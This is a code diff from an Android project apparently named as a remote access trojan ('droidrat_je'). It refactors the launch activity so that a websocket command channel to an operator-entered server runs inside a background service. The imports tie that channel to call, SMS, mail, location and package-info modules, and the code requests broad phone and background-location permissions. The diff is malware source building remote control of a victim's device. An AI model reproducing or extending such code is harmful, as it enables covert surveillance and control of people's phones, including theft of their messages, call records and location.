@@ -2,36 +2,21 @@ package com.je_chen.droidrat_je.activity;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
-import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.hardware.SensorManager;
-import android.location.LocationManager;
 import android.os.Build;
 import android.os.Bundle;
-import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ImageView;
 
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.content.ContextCompat;
 
 import com.je_chen.droidrat_je.R;
-import com.je_chen.droidrat_je.appintent.call.Call;
-import com.je_chen.droidrat_je.appintent.call.CallLogs;
-import com.je_chen.droidrat_je.appintent.mail.SendMail;
-import com.je_chen.droidrat_je.appintent.sms.SMS;
-import com.je_chen.droidrat_je.appintent.web.Web;
 import com.je_chen.droidrat_je.appsinfo.checkpermission.PermissionsCheck;
-import com.je_chen.droidrat_je.appsinfo.getinfo.GetPackagesInfo;
-import com.je_chen.droidrat_je.command.process.CommandProcess;
-import com.je_chen.droidrat_je.location.LocationGeocoder;
-import com.je_chen.droidrat_je.location.LocationSystem;
-import com.je_chen.droidrat_je.socket.websocket.Websocket;
-import com.je_chen.droidrat_je.vibrator.VibratorSystem;
+import com.je_chen.droidrat_je.service.command.ProcessCommandService;
 
-import java.net.URI;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -42,13 +27,7 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
 
     PackageManager packageManager;
 
-    CommandProcess commandProcess;
-
-    SensorManager sensorManager;
-
     PermissionsCheck permissionsCheck;
-
-    public static Websocket websocket;
 
     Button testButton, connectButton;
 
@@ -64,8 +43,6 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
 
         packageManager = getPackageManager();
         permissionsCheck = new PermissionsCheck(packageManager);
-        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
-        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
         List<String> requestPermission = new ArrayList<>(Arrays.asList(
                 // PHONE
@@ -100,11 +77,13 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
             requestPermission.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
         }
 
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+            requestPermission.add(Manifest.permission.FOREGROUND_SERVICE);
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             permissionsCheck.checkPermission(this, requestPermission.toArray(new String[requestPermission.size()]));
         }
-
-        commandProcess = new CommandProcess(this,packageManager,sensorManager,locationManager, "gps", 5000, 5);
 
         testButton = findViewById(R.id.testButton);
         testButton.setOnClickListener(this);
@@ -147,19 +126,9 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
 
 
             case R.id.connectButton:
-                try {
-                    URI uri = URI.create(webSocketServerText.getText().toString());
-                    websocket = new Websocket(uri) {
-                        @Override
-                        public void onMessage(String message) {
-                            System.out.println("WebSocket Message:" + message);
-                            commandProcess.processString(message);
-                        }
-                    };
-                    websocket.connect();
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                Intent startBackgroundService = new Intent(this, ProcessCommandService.class);
+                startBackgroundService.putExtra("URI", webSocketServerText.getText().toString());
+                startService(startBackgroundService);
                 break;
         }
     }
